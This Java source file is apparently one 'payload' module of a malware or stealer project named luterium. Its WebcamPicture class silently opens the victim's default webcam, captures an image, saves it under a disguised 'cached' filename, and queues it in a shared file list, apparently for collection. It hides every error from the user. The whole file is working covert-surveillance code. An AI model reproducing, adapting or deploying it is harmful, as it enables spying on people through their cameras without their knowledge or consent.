package dev.peter.luterium.features;

import com.github.sarxos.webcam.Webcam;
import dev.peter.luterium.payload.PayloadExecutor;

import javax.imageio.ImageIO;
import java.io.File;
import java.util.Random;

import static dev.peter.luterium.Main.fileList;

/**
 * @author Peter
 * @since 08/26/2022
 */

public class WebcamPicture implements PayloadExecutor {
    @Override
    public void execute() throws Exception {
        try {
            Webcam cam = Webcam.getDefault();
            cam.open();
            int random = Math.abs(new Random().nextInt());
            File webcam = new File("1cached_" + random + ".png");
            ImageIO.write(cam.getImage(), "PNG", webcam);
            cam.close();
            fileList.add(webcam);
        } catch (Exception ignored) {}
    }
}
